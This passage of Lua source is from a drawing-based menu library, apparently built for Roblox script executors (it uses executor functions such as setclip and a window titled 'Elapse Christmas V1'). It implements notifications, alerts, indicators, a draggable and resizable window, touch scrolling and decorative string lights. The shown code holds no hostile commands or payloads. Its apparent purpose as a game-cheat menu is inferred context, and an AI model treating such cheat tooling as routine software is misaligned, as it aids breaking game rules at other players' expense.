            ThemeColor = accentColor == nil and 'Accent' or '';
            ZIndex = z+3;
            Parent = objs.background;
        })

        if accentColor then
            objs.accentBar.Color = accentColor;
            objs.progress.Color = accentColor;
        end

        -- size the card to the text, then park it off-screen to the left
        notification.width = math.max(objs.text.TextBounds.X + 22, notifSettings.minWidth)
        objs.background.Size = newUDim2(0, notification.width, 0, height)
        objs.background.Position = newUDim2(0, -(notification.width + notifSettings.x + 10), 0, 0)

        -- start fully transparent and remember where each piece should fade to
        for name, obj in next, objs do
            if name ~= 'holder' then
                notification.targets[obj] = obj.Transparency
                obj.Transparency = 0
            end
        end

        local function fade(visible, duration, direction)
            for obj, target in next, notification.targets do
                utility:Tween(obj, 'Transparency', visible and target or 0, duration, direction, Enum.EasingStyle.Quad)
            end
        end

        function notification:Remove()
            local idx = table.find(library.notifications, notification)
            if idx then
                table.remove(library.notifications, idx)
            end
            if objs.holder then
                objs.holder:Remove()
            end
            library:UpdateNotifications()
        end

        function notification:Dismiss()
            if self.removing then return end
            self.removing = true

            fade(false, notifSettings.outTime * .9, Enum.EasingDirection.In)
            local outTween = utility:Tween(objs.background, 'Position', newUDim2(0, -(self.width + notifSettings.x + 10), 0, 0), notifSettings.outTime, Enum.EasingDirection.In, Enum.EasingStyle.Quint)

            if outTween then
                outTween.Completed:Once(function()
                    notification:Remove()
                end)
            else
                notification:Remove()
            end
        end

        table.insert(self.notifications, notification)

        -- too many on screen: push the oldest out early
        local active = {}
        for _, v in ipairs(self.notifications) do
            if not v.removing then
                table.insert(active, v)
            end
        end
        for i = 1, #active - notifSettings.maxVisible do
            active[i]:Dismiss()
        end

        self:UpdateNotifications()

        -- in
        fade(true, notifSettings.inTime, Enum.EasingDirection.Out)
        utility:Tween(objs.background, 'Position', newUDim2(0, 0, 0, 0), notifSettings.inTime, Enum.EasingDirection.Out, Enum.EasingStyle.Quint)

        -- countdown bar shrinks over the lifetime of the notification
        utility:Tween(objs.progress, 'Size', newUDim2(0, 0, 0, 1), time, Enum.EasingDirection.InOut, Enum.EasingStyle.Linear)

        task.delay(time, function()
            if objs.background and objs.background.Object then
                notification:Dismiss()
            end
        end)

        return notification
    end

    self.notificationSettings = {
        x = 14;          -- left margin
        y = 60;          -- top of the stack
        height = 24;     -- card height
        spacing = 6;     -- gap between cards
        minWidth = 140;
        maxVisible = 7;
        inTime = .45;
        outTime = .35;
    }

    function self:UpdateNotifications()
        local settings = self.notificationSettings
        local slot = 0
        for _, v in ipairs(self.notifications) do
            if not v.removing then
                local target = newUDim2(0, settings.x, 0, settings.y + slot * (settings.height + settings.spacing))
                utility:Tween(v.objects.holder, 'Position', target, .3, Enum.EasingDirection.Out, Enum.EasingStyle.Quint)
                slot += 1
            end
        end
    end

    -- // Alerts
    -- centered boxes near the top middle of the screen, styled like the menu (accent top line, borders,
    -- countdown bar). they drop + fade in, stack downwards and rise + fade out.
    --   library:SendAlert('Target locked', 3)
    --   library:SendAlert('Low health!', 5, Color3.fromRGB(255, 60, 60))
    --   local a = library:SendAlert('Loading...', 999); a:SetText('Done'); a:Dismiss()
    self.alerts = {}
    self.alertSettings = {
        y = 34;          -- top of the stack (just under the default watermark spot)
        height = 22;
        spacing = 5;
        minWidth = 160;
        padding = 28;    -- horizontal space around the text
        maxVisible = 4;
        inTime = .35;
        outTime = .3;
        offset = 10;     -- how far it drops in from / rises out to
    }

    function self:UpdateAlerts()
        local settings = self.alertSettings
        local screen = workspace.CurrentCamera.ViewportSize
        local slot = 0
        for _, a in ipairs(self.alerts) do
            if not a.removing then
                local target = newUDim2(0, floor(screen.X / 2 - a.width / 2), 0, settings.y + slot * (settings.height + settings.spacing))
                if a.placed then
                    utility:Tween(a.objects.holder, 'Position', target, .3, Enum.EasingDirection.Out, Enum.EasingStyle.Quint)
                else
                    a.objects.holder.Position = target
                    a.placed = true
                end
                slot += 1
            end
        end
    end

    function self:SendAlert(message, time, color)
        time = time or 4
        if typeof(message) ~= 'string' then
            return error(string.format('invalid message type, got %s, expected string', typeof(message)))
        elseif typeof(time) ~= 'number' then
            return error(string.format('invalid time type, got %s, expected number', typeof(time)))
        elseif color ~= nil and typeof(color) ~= 'Color3' then
            return error(string.format('invalid color type, got %s, expected color3', typeof(color)))
        end

        local settings = self.alertSettings
        local z = self.zindexOrder.notification
        local height = settings.height

        local alert = {
            objects = {};
            targets = {};
            width = 0;
            removing = false;
            placed = false;
        }
        local objs = alert.objects

        objs.holder = utility:Draw('Square', {
            Size = newUDim2(0, 0, 0, height);
            Transparency = 0;
            ZIndex = z;
            NoHit = true;
        })

        objs.background = utility:Draw('Square', {
            Size = newUDim2(0, 200, 0, height);
            ThemeColor = 'Background';
            ZIndex = z;
            NoHit = true;
            Parent = objs.holder;
        })

        objs.border1 = utility:Draw('Square', {
            Size = newUDim2(1,2,1,2);
            Position = newUDim2(0,-1,0,-1);
            ThemeColor = 'Border 1';
            ZIndex = z-1;
            NoHit = true;
            Parent = objs.background;
        })

        objs.border2 = utility:Draw('Square', {
            Size = newUDim2(1,2,1,2);
            Position = newUDim2(0,-1,0,-1);
            ThemeColor = 'Border 3';
            ZIndex = z-2;
            NoHit = true;
            Parent = objs.border1;
        })

        objs.gradient = utility:Draw('Image', {
            Size = newUDim2(1,0,1,0);
            Data = self.images.gradientp90;
            Visible = false; -- flat look (gradient kept for scripts that want it back)
            Transparency = .35;
            ZIndex = z+1;
            Parent = objs.background;
        })

        objs.topBar = utility:Draw('Square', {
            Size = newUDim2(1,0,0,1);
            ThemeColor = color == nil and 'Accent' or '';
            ZIndex = z+3;
            NoHit = true;
            Parent = objs.background;
        })

        objs.text = utility:Draw('Text', {
            Position = newUDim2(.5,0,.5,-7);
            ThemeColor = 'Primary Text';
            Text = message;
            Center = true;
            Outline = true;
            Font = 2;
            Size = 13;
            ZIndex = z+4;
            Parent = objs.background;
        })

        objs.progress = utility:Draw('Square', {
            Size = newUDim2(1,0,0,1);
            Position = newUDim2(0,0,1,-1);
            ThemeColor = color == nil and 'Accent' or '';
            ThemeColorOffset = color == nil and -60 or 0;
            ZIndex = z+3;
            NoHit = true;
            Parent = objs.background;
        })

        if color then
            objs.topBar.Color = color
            objs.progress.Color = color
        end

        local function resize()
            alert.width = math.max(objs.text.TextBounds.X + settings.padding, settings.minWidth)
            objs.background.Size = newUDim2(0, alert.width, 0, height)
        end
        resize()

        -- start invisible, a little above its spot
        for name, obj in next, objs do
            if name ~= 'holder' then
                alert.targets[obj] = obj.Transparency
                obj.Transparency = 0
            end
        end
        objs.background.Position = newUDim2(0, 0, 0, -settings.offset)

        local function fade(visible, duration, direction)
            for obj, target in next, alert.targets do
                utility:Tween(obj, 'Transparency', visible and target or 0, duration, direction, Enum.EasingStyle.Quad)
            end
        end

        function alert:SetText(str)
            if typeof(str) == 'string' and objs.text.Object then
                objs.text.Text = str
                resize()
                library:UpdateAlerts()
            end
        end

        function alert:Remove()
            local idx = table.find(library.alerts, alert)
            if idx then
                table.remove(library.alerts, idx)
            end
            if objs.holder and objs.holder.Object then
                objs.holder:Remove()
            end
            library:UpdateAlerts()
        end

        function alert:Dismiss()
            if self.removing then return end
            self.removing = true
            library:UpdateAlerts()
            fade(false, settings.outTime * .9, Enum.EasingDirection.In)
            local outTween = utility:Tween(objs.background, 'Position', newUDim2(0, 0, 0, -settings.offset), settings.outTime, Enum.EasingDirection.In, Enum.EasingStyle.Quad)
            if outTween then
                outTween.Completed:Once(function()
                    alert:Remove()
                end)
            else
                alert:Remove()
            end
        end

        table.insert(self.alerts, alert)

        -- too many: push the oldest out early
        local active = {}
        for _, a in ipairs(self.alerts) do
            if not a.removing then
                table.insert(active, a)
            end
        end
        for i = 1, #active - settings.maxVisible do
            active[i]:Dismiss()
        end

        self:UpdateAlerts()

        -- in
        fade(true, settings.inTime, Enum.EasingDirection.Out)
        utility:Tween(objs.background, 'Position', newUDim2(0, 0, 0, 0), settings.inTime, Enum.EasingDirection.Out, Enum.EasingStyle.Quint)
        -- countdown bar shrinks towards the middle
        utility:Tween(objs.progress, 'Size', newUDim2(0, 0, 0, 1), time, Enum.EasingDirection.InOut, Enum.EasingStyle.Linear)
        utility:Tween(objs.progress, 'Position', newUDim2(.5, 0, 1, -1), time, Enum.EasingDirection.InOut, Enum.EasingStyle.Linear)

        task.delay(time, function()
            if objs.background and objs.background.Object then
                alert:Dismiss()
            end
        end)

        return alert
    end

    function self.NewIndicator(data)
        local indicator = {
            title = data.title or 'indicator',
            enabled = data.enabled or false,
            position = data.position or newUDim2(0,15,0,300),
            values = {},
            objects = {valueObjects = {}},
            spacing = '   ',
        };

        table.insert(self.indicators, indicator)

        -- Create Objects --
        do
            local z = self.zindexOrder.indicator;
            local objs = indicator.objects;

            objs.background = utility:Draw('Square', {
                Size = newUDim2(0, 200, 0, 16);
                Position = indicator.position;
                ThemeColor = 'Background';
                ZIndex = z;
            })

            objs.border1 = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 2';
                Parent = objs.background;
                ZIndex = z-1;
            })

            objs.border2 = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 3';
                Parent = objs.border1;
                ZIndex = z-2;
            })

            objs.topborder = utility:Draw('Square', {
                Size = newUDim2(1,0,0,1);
                ThemeColor = 'Accent';
                Parent = objs.background;
                ZIndex = z+1;
            })

            objs.textlabel = utility:Draw('Text', {
                Position = newUDim2(.5,0,0,1);
                ThemeColor = 'Primary Text';
                Text = indicator.title;
                Size = 13;
                Font = 2;
                ZIndex = z+2;
                Center = true;
                Outline = true;
                Parent = objs.background;
            });

        end
        --------------------

        -- drag it around while the menu is open (value rows are added as handles in AddValue)
        indicator.drag = utility:MakeDraggable({indicator.objects.background, indicator.objects.topborder}, function()
            return indicator.objects.background.Object.Position
        end, function(p)
            indicator:SetPosition(newUDim2(0, p.X, 0, p.Y))
        end, function()
            if indicator.onMoved then
                indicator.onMoved(indicator.position)
            end
        end)

        function indicator:Update()
            local xSize  = 125
            local yPos  = 0
            table.sort(self.values, function(a,b)
                return a.order < b.order;
            end)

            for _,v in next, self.values do
                v.objects.keyLabel.Text = tostring(v.key);
                v.objects.valueLabel.Text = tostring(v.value);
            
                v.objects.valueLabel.Position = newUDim2(1,-(v.objects.valueLabel.TextBounds.X + 3),0,0)
                v.objects.background.Position = newUDim2(0,0,1,3 + yPos)
                v.objects.background.Visible = v.enabled

                if v.enabled then
                    yPos = yPos + 16 + 3
                    local x = (v.objects.keyLabel.TextBounds.X + 10 + v.objects.valueLabel.TextBounds.X)
                    if x > xSize then
                        xSize = x
                    end
                end
            end

            self.objects.background.Size = newUDim2(0,xSize + 8,0,16)
            self.objects.background.Position = self.position
        end

        function indicator:AddValue(data)
            local value = {
                key = data.key or '',
                value = data.value or '',
                order = data.order or #self.values+1,
                enabled = data.enabled == nil and true or data.enabled,
                objects = {},
            }

            table.insert(self.values, value);

            -- Create Objects --
            do
                local z = library.zindexOrder.indicator;
                local objs = value.objects;

                objs.background = utility:Draw('Square', {
                    Size = newUDim2(1, 0, 0, 16);
                    ThemeColor = 'Background';
                    ZIndex = z;
                    Parent = indicator.objects.background;
                })
                indicator.drag:AddHandle(objs.background) -- rows drag the whole indicator too
    
                objs.border1 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border 2';
                    Parent = objs.background;
                    ZIndex = z-1;
                })
    
                objs.border2 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border 3';
                    Parent = objs.border1;
                    ZIndex = z-2;
                })
    
                objs.keyLabel = utility:Draw('Text', {
                    Position = newUDim2(0,3,0,1);
                    ThemeColor = 'Option Text 2';
                    Size = 13;
                    Font = 2;
                    ZIndex = z+2;
                    Outline = true;
                    Parent = objs.background;
                });

                objs.valueLabel = utility:Draw('Text', {
                    Position = newUDim2(0,0,0,1);
                    ThemeColor = 'Option Text 2';
                    Size = 13;
                    Font = 2;
                    ZIndex = z+2;
                    Outline = true;
                    Parent = objs.background;
                });

            end
            --------------------

            function value:Remove()
                table.remove(indicator.values, table.find(indicator.values, value))
                self.objects.background:Remove()
                table.clear(self)
                indicator:Update();
            end

            function value:SetEnabled(bool)
                if typeof(bool) == 'boolean' then
                    self.enabled = bool
                    indicator:Update()
                end
            end

            function value:SetValue(str)
                if typeof(str) == 'string' then
                    self.value = str
                    indicator:Update()
                end
            end

            function value:SetKey(str)
                if typeof(str) == 'string' then
                    self.key = str
                    indicator:Update()
                end
            end

            self:Update()
            return value
        end

        function indicator:GetValue(idx)
            if typeof(idx) == 'number' then
                return self.values[idx]
            else
                for i,v in next, self.values do
                    if v.key == idx then
                        return v
                    end
                end
            end
        end

        function indicator:SetEnabled(bool)
            if typeof(bool) == 'boolean' then
                self.enabled = bool;
                self.objects.background.Visible = bool;
                self:Update();
            end
        end

        function indicator:SetPosition(udim2)
            if typeof(udim2) == 'UDim2' then
                self.position = udim2
                self.objects.background.Position = udim2;
            end
        end

        for i,v in next, data.values or {} do
            indicator:AddValue({key = tostring(i), value = tostring(v)})
        end

        indicator:SetEnabled(indicator.enabled);
        return indicator
    end

    function self.NewWindow(data)
        local window = {
            title = data.title or 'Elapse Christmas V1',
            selectedTab = nil;
            tabs = {},
            objects = {},
            colorpicker = {
                objects = {};
                color = c3new(1,0,0);
                trans = 0;
            };
            dropdown = {
                objects = {
                    values = {};
                };
                max = data.maxDropdownItems or 8; -- rows visible before the list scrolls
            }
        };

        table.insert(library.windows, window);

        ----- Create Objects ----
        -- layout: title bar across the top, tab sidebar on the left, content panel on the right.
        -- with the lights on, the title bar gets a strip on top for the garland to hang in.
        -- the title and the subtitle under it are both centered and styled the same.
        local GARLAND_H = library.lights.enabled and 22 or 0
        local subtitleText = tostring(data.subtitle or library.gamename)
        local hasSubtitle = subtitleText ~= ''
        local TITLE_H = GARLAND_H + (hasSubtitle and 50 or 34)
        local TITLE_Y = GARLAND_H + 9 -- where the title text sits
        local SIDEBAR_W = tonumber(data.sidebarWidth) or 176 -- wide enough for the discord invite
        window.titleHeight, window.sidebarWidth = TITLE_H, SIDEBAR_W
        do
            local size = data.size or newUDim2(0, 700, 0, 640);
            local position = data.position or newUDim2(0, 250, 0, 150);

            -- small screens (phones): shrink to fit and center. the content scrolls, so nothing is lost
            local screen = workspace.CurrentCamera.ViewportSize
            local fitW = math.min(size.X.Offset, math.max(screen.X - 16, 320))
            local fitH = math.min(size.Y.Offset, math.max(screen.Y - 16, 240))
            if size.X.Scale == 0 and size.Y.Scale == 0 and (fitW ~= size.X.Offset or fitH ~= size.Y.Offset) then
                size = newUDim2(0, fitW, 0, fitH)
                position = newUDim2(0, floor(math.max((screen.X - fitW) / 2, 0)), 0, floor(math.max((screen.Y - fitH) / 2, 0)))
            end
            -- short windows don't have room for the dog picture under the tabs
            window.compact = size.Y.Offset < 520

            -- // Fit small screens: shrink the window if it's wider or taller than the viewport,
            -- then center it. phones in portrait can easily be narrower than 700px.
            pcall(function()
                local vp = workspace.CurrentCamera.ViewportSize
                local inset = newVector2(0, 0)
                pcall(function() inset = guiservice:GetGuiInset() end)
                local maxW = vp.X - 16  -- 8px margin each side
                local maxH = vp.Y - inset.Y - 16
                local wPx = size.X.Offset
                local hPx = size.Y.Offset
                if wPx > maxW or hPx > maxH then
                    wPx = math.min(wPx, maxW)
                    hPx = math.min(hPx, maxH)
                    size = newUDim2(0, math.floor(wPx), 0, math.floor(hPx))
                    -- center on screen
                    position = newUDim2(0, math.floor((vp.X - wPx) / 2), 0, math.floor((vp.Y - inset.Y - hPx) / 2 + inset.Y))
                end
            end)

            local objs = window.objects;
            local z = library.zindexOrder.window;

            objs.background = utility:Draw('Square', {
                Size = size;
                Position = position;
                ThemeColor = 'Background';
                ZIndex = z;
            })

            objs.border1 = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 1';
                ZIndex = z-1;
                Parent = objs.background;
            })

            -- outermost edge; the light strand and the glow are laid out around this
            objs.frame = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 3';
                ZIndex = z-2;
                Parent = objs.border1;
            })

            -- old names, for scripts that poked at periastron's borders
            objs.innerBorder1, objs.outerBorder2 = objs.border1, objs.frame

            -- // Title bar
            objs.titleBar = utility:Draw('Square', {
                Size = newUDim2(1,0,0,TITLE_H);
                ThemeColor = 'Title Background';
                ZIndex = z+1;
                Parent = objs.background;
            })

            objs.titleLine = utility:Draw('Square', {
                Size = newUDim2(1,0,0,1);
                Position = newUDim2(0,0,1,-1);
                ThemeColor = 'Accent';
                ZIndex = z+4;
                NoHit = true;
                Parent = objs.titleBar;
            })

            objs.title = utility:Draw('Text', {
                Position = newUDim2(.5,0,0,TITLE_Y);
                ThemeColor = 'Primary Text';
                Text = window.title;
                Font = 2;
                Size = 13;
                ZIndex = z+3;
                Outline = true;
                Center = true;
                Parent = objs.titleBar;
            })

            -- same look as the title, on the line under it
            objs.subtitle = utility:Draw('Text', {
                Position = newUDim2(.5,0,0,TITLE_Y + 16);
                ThemeColor = 'Primary Text';
                Text = subtitleText;
                Font = 2;
                Size = 13;
                ZIndex = z+3;
                Outline = true;
                Center = true;
                Visible = hasSubtitle;
                Parent = objs.titleBar;
            })

            objs.dragdetector = utility:Draw('Square',{
                Size = newUDim2(1,0,1,0);
                Parent = objs.titleBar;
                Transparency = 0;
                ZIndex = z+2;
            })

            -- // Sidebar (tabs are stacked vertically in here)
            objs.sidebar = utility:Draw('Square', {
                Size = newUDim2(0,SIDEBAR_W,1,-TITLE_H);
                Position = newUDim2(0,0,0,TITLE_H);
                ThemeColor = 'Sidebar Background';
                ZIndex = z+1;
                Parent = objs.background;
            })

            objs.sidebarLine = utility:Draw('Square', {
                Size = newUDim2(0,1,1,0);
                Position = newUDim2(1,0,0,0);
                ThemeColor = 'Border 1';
                ZIndex = z+2;
                NoHit = true;
                Parent = objs.sidebar;
            })

            -- room for the dog picture at the bottom of the sidebar (always shown, except on short screens)
            local mascotCfg = library.mascot
            local mascotSize = tonumber(mascotCfg.size) or 84
            local mascotRoom = window.compact and 0 or (mascotSize + 10)
            window.mascotRoom = mascotRoom -- UpdateTabs drops the picture if the tabs need the space

            objs.tabHolder = utility:Draw('Square', {
                Size = newUDim2(1,-16,1,-44 - mascotRoom);
                Position = newUDim2(0,8,0,12);
                Transparency = 0;
                ZIndex = z+2;
                Parent = objs.sidebar;
            })

            -- accent bar that slides next to the selected tab
            objs.tabIndicator = utility:Draw('Square', {
                Size = newUDim2(0,2,0,0);
                ThemeColor = 'Accent';
                ZIndex = z+8;
                NoHit = true;
                Parent = objs.tabHolder;
            })

            -- discord invite at the bottom left; click it to copy
            objs.sidebarFooter = utility:Draw('Text', {
                Position = newUDim2(.5,0,1,-22);
                ThemeColor = 'Unselected Tab Text';
                Text = tostring(data.footer or library.discord);
                Font = 2;
                Size = 13;
                ZIndex = z+3;
                Outline = true;
                Center = true;
                Parent = objs.sidebar;
            })

            objs.sidebarFooterButton = utility:Draw('Square', {
                Size = newUDim2(1,-12,0,20);
                Position = newUDim2(0,6,1,-25);
                Transparency = 0;
                ZIndex = z+4;
                Parent = objs.sidebar;
            })

            utility:Connection(objs.sidebarFooterButton.MouseEnter, function()
                objs.sidebarFooter.ThemeColor = 'Accent';
            end)
            utility:Connection(objs.sidebarFooterButton.MouseLeave, function()
                objs.sidebarFooter.ThemeColor = 'Unselected Tab Text';
            end)
            utility:Connection(objs.sidebarFooterButton.MouseButton1Down, function()
                if setclip(objs.sidebarFooter.Text) then
                    library:SendNotification('Discord invite copied: '..objs.sidebarFooter.Text, 3);
                end
            end)

            -- // Dog picture (downloaded in the background, shows up once it's loaded)
            objs.mascot = utility:Draw('Image', {
                Size = newUDim2(0,mascotSize,0,mascotSize);
                Position = newUDim2(.5,-mascotSize/2,1,-(mascotSize + 30));
                Visible = not window.compact;
                ZIndex = z+3;
                Parent = objs.sidebar;
            })

            task.spawn(function()
                local bytes = library.RobloxImage(mascotCfg.id)
                if bytes and objs.mascot.Object ~= nil then -- still loaded
                    objs.mascot.Data = bytes
                end
            end)

            -- // Content panel
            objs.groupBackground = utility:Draw('Square', {
                Size = newUDim2(1,-(SIDEBAR_W+17),1,-(TITLE_H+17));
                Position = newUDim2(0,SIDEBAR_W+9,0,TITLE_H+8);
                ThemeColor = 'Group Background';
                ZIndex = z+5;
                Parent = objs.background;
            })

            objs.groupInnerBorder = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 1';
                ZIndex = z+4;
                Parent = objs.groupBackground;
            })

            objs.groupOuterBorder = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 3';
                ZIndex = z+3;
                Parent = objs.groupInnerBorder;
            })

            objs.columnholder1 = utility:Draw('Square', {
                Size = newUDim2(.48, 0, .96, 0);
                Position = newUDim2(.01, 0, .02, 0);
                Transparency = 0;
                ZIndex = z+6;
                Parent = objs.groupBackground;
            })

            objs.columnholder2 = utility:Draw('Square', {
                Size = newUDim2(.48, 0, .96, 0);
                Position = newUDim2(1 - (.48 + .01), 0, .02, 0);
                Transparency = 0;
                ZIndex = z+6;
                Parent = objs.groupBackground;
            })

            local dragging, mouseStart, objStart;

            utility:Connection(objs.dragdetector.MouseButton1Down, function(pos)
                -- stop the open animation so it doesn't fight the drag
                local running = library.tweens[objs.background] and library.tweens[objs.background].Position
                if running then
                    running:Cancel();
                    if window.restPosition then
                        objs.background.Position = window.restPosition;
                    end
                end
                dragging = true;
                mouseStart = newUDim2(0, pos.X, 0, pos.Y);
                objStart = objs.background.Position;
            end)

            utility:Connection(button1up, function()
                dragging = false;
            end)

            utility:Connection(mousemove, function(pos)
                if dragging then
                    if window.open then
                        objs.background.Position = objStart + newUDim2(0, pos.X, 0, pos.Y) - mouseStart;
                        window.restPosition = objs.background.Position;
                    else
                        dragging = false
                    end
                end
            end)

            -- // Drag to pan on mobile: dragging empty space on the sidebar or content panel
            -- moves the whole window, so you can reach parts that extend past the screen edge.
            -- only on touch devices — on PC the sidebar and panel shouldn't eat mouse drags.
            if isMobile then
                local function startPanDrag(hitObj)
                    return function(pos)
                        -- only pan when tapping empty space (not a toggle/slider/button)
                        local hover = utility:GetHoverObject()
                        local hoverData = hover and library.drawings[hover]
                        if hoverData and hover ~= hitObj then return end
                        local running = library.tweens[objs.background] and library.tweens[objs.background].Position
                        if running then
                            running:Cancel()
                            if window.restPosition then
                                objs.background.Position = window.restPosition
                            end
                        end
                        dragging = true
                        mouseStart = newUDim2(0, pos.X, 0, pos.Y)
                        objStart = objs.background.Position
                    end
                end
                utility:Connection(objs.sidebar.MouseButton1Down, startPanDrag(objs.sidebar))
                utility:Connection(objs.groupBackground.MouseButton1Down, startPanDrag(objs.groupBackground))
            end

            -- // Resize handle: a small grip in the bottom-right corner. drag it to resize the window.
            local MIN_W, MIN_H = 420, 340
            local resizing, resizeStart, resizeStartSize

            -- three small diagonal lines (the classic resize grip)
            objs.resizeGrip1 = utility:Draw('Line', {
                Thickness = 1;
                ThemeColor = 'Border 1';
                ZIndex = z + 10;
                NoHit = true;
                Parent = objs.background;
            })
            objs.resizeGrip2 = utility:Draw('Line', {
                Thickness = 1;
                ThemeColor = 'Border 1';
                ZIndex = z + 10;
                NoHit = true;
                Parent = objs.background;
            })
            objs.resizeGrip3 = utility:Draw('Line', {
                Thickness = 1;
                ThemeColor = 'Border 1';
                ZIndex = z + 10;
                NoHit = true;
                Parent = objs.background;
            })

            -- invisible hit area over the corner
            objs.resizeHit = utility:Draw('Square', {
                Size = newUDim2(0, 16, 0, 16);
                Position = newUDim2(1, -16, 1, -16);
                Transparency = 0;
                ZIndex = z + 9;
                Parent = objs.background;
            })

            -- position the grip lines relative to the background size (called every frame while visible)
            local function updateGripLines()
                local bgSize = objs.background.Size
                local bw = bgSize.X.Offset
                local bh = bgSize.Y.Offset
                -- three lines from bottom-right corner going up-left, spaced 4px apart
                objs.resizeGrip1:SetPoints(newVector2(bw - 5, bh - 1), newVector2(bw - 1, bh - 5))
                objs.resizeGrip2:SetPoints(newVector2(bw - 9, bh - 1), newVector2(bw - 1, bh - 9))
                objs.resizeGrip3:SetPoints(newVector2(bw - 13, bh - 1), newVector2(bw - 1, bh - 13))
            end
            updateGripLines()

            utility:Connection(objs.resizeHit.MouseButton1Down, function(pos)
                resizing = true
                resizeStart = newVector2(pos.X, pos.Y)
                resizeStartSize = objs.background.Size
            end)

            utility:Connection(button1up, function()
                resizing = false
            end)

            utility:Connection(mousemove, function(pos)
                if resizing and window.open then
                    local dx = pos.X - resizeStart.X
                    local dy = pos.Y - resizeStart.Y
                    local newW = math.max(resizeStartSize.X.Offset + dx, MIN_W)
                    local newH = math.max(resizeStartSize.Y.Offset + dy, MIN_H)
                    objs.background.Size = newUDim2(0, math.floor(newW), 0, math.floor(newH))
                    updateGripLines()
                end
            end)

        end
        -------------------------

        ---- Touch scrolling ----
        -- phones have no mouse wheel: dragging a finger on empty panel space (or a section's header /
        -- background) scrolls the selected tab. taps on options still go to the options, they sit on top.
        do
            local scrollDrag = nil

            function window:BeginTouchScroll(pos)
                if not pointer.touch then return end
                local tab = window.selectedTab
                if not tab or not tab.maxScrollY or tab.maxScrollY <= 0 then return end
                scrollDrag = {startY = pos.Y, startScroll = tab.scrollY or 0, tab = tab}
            end

            utility:Connection(mousemove, function(pos)
                if scrollDrag then
                    local tab = scrollDrag.tab
                    if not window.open or window.selectedTab ~= tab then
                        scrollDrag = nil
                        return
                    end
                    local target = clamp(scrollDrag.startScroll - (pos.Y - scrollDrag.startY), 0, tab.maxScrollY or 0)
                    if target ~= tab.scrollY then
                        tab.scrollY = target
                        tab:UpdateSections()
                    end
                end
            end)

            -- same for a tab list that's longer than the sidebar
            local tabDrag = nil

            function window:BeginTabScroll(pos)
                if not pointer.touch or (window.maxTabScroll or 0) <= 0 then return end
                tabDrag = {startY = pos.Y, startScroll = window.tabScroll or 0}
            end

            utility:Connection(mousemove, function(pos)
                if tabDrag then
                    if not window.open then
                        tabDrag = nil
                        return
                    end
                    local target = clamp(tabDrag.startScroll - (pos.Y - tabDrag.startY), 0, window.maxTabScroll or 0)
                    if target ~= window.tabScroll then
                        window.tabScroll = target
                        window:UpdateTabs()
                    end
                end
            end)

            utility:Connection(button1up, function()
                scrollDrag = nil
                tabDrag = nil
            end)

            for _, handle in ipairs({window.objects.groupBackground, window.objects.columnholder1, window.objects.columnholder2}) do
                utility:Connection(handle.MouseButton1Down, function(pos)
                    window:BeginTouchScroll(pos)
                end)
            end
            for _, handle in ipairs({window.objects.sidebar, window.objects.tabHolder}) do
                utility:Connection(handle.MouseButton1Down, function(pos)
                    window:BeginTabScroll(pos)
                end)
            end
        end
        -------------------------

        ---- String lights ----
        -- A garland hung across the top of the window, inside the title bar strip:
        -- the wire is hooked at regular points and droops between them, and the bulbs hang straight
        -- down from the wire, swinging a little. The colors switch one bulb along every
        -- cfg.colorStep seconds, which makes the strand look like it's moving (chasing lights).
        -- The bulbs are not parented (they're placed directly every tick, so dragging never snaps
        -- them) and nothing here is a hit area, so the lights never block clicks or dragging.
        -- Wrapped in pcall so a Drawing quirk can't break the window.
        local lightsOk, lightsErr = pcall(function()
            local cfg = library.lights
            local objs = window.objects
            local z = library.zindexOrder.window
            local frame = objs.frame
            local strip = objs.titleBar
            local white, black = c3new(1, 1, 1), c3new(0, 0, 0)
            local wireColor, wireShine = fromrgb(30, 52, 36), fromrgb(62, 92, 70)
            local socketColor, hookColor = fromrgb(70, 78, 72), fromrgb(120, 124, 120)
            local INSET = 10 -- gap between the window sides and the first / last hook

            local function setShown(drawing, shown)
                if drawing.Visible ~= shown then
                    drawing.Visible = shown
                end
            end

            -- soft drop shadow under the window (parented, so it moves and fades with it)
            local shadowLayers = {}
            for i = 1, 4 do
                shadowLayers[i] = utility:Draw('Square', {
                    Size = newUDim2(1, i * 4, 1, i * 4);
                    Position = newUDim2(0, -i * 2, 0, -i * 2 + 3);
                    Color = black;
                    Transparency = .14 - i * .03;
                    ZIndex = z - 20 - i;
                    NoHit = true;
                    Parent = frame;
                })
            end

            -- // Pools (grow on demand when the window gets wider)
            local bulbs, wires, hooks = {}, {}, {}

            local function newBulb()
                local b = {seed = math.random() * 100}
                b.glowOuter = utility:Draw('Circle', {Filled = true, NumSides = 20, Radius = 11, Transparency = 0, Visible = false, ZIndex = z + 2})
                b.glowInner = utility:Draw('Circle', {Filled = true, NumSides = 16, Radius = 6, Transparency = 0, Visible = false, ZIndex = z + 2})
                b.socket = utility:Draw('Line', {Thickness = 3.5, Color = socketColor, Transparency = 1, Visible = false, ZIndex = z + 5})
                b.body = utility:Draw('Circle', {Filled = true, NumSides = 16, Radius = 3, Transparency = 1, Visible = false, ZIndex = z + 6})
                -- pointed end of the bulb (C9 / teardrop shape)
                b.tip = utility:Draw('Triangle', {Filled = true, Thickness = 1, Transparency = 1, Visible = false, ZIndex = z + 6})
                b.shine = utility:Draw('Circle', {Filled = true, NumSides = 8, Radius = 1, Color = white, Transparency = 0, Visible = false, ZIndex = z + 7})
                b.parts = {b.glowOuter, b.glowInner, b.socket, b.body, b.tip, b.shine}
                return b
            end

            local function newWire()
                -- dark wire with a thin lighter line on top, so it reads as a twisted cord
                return {
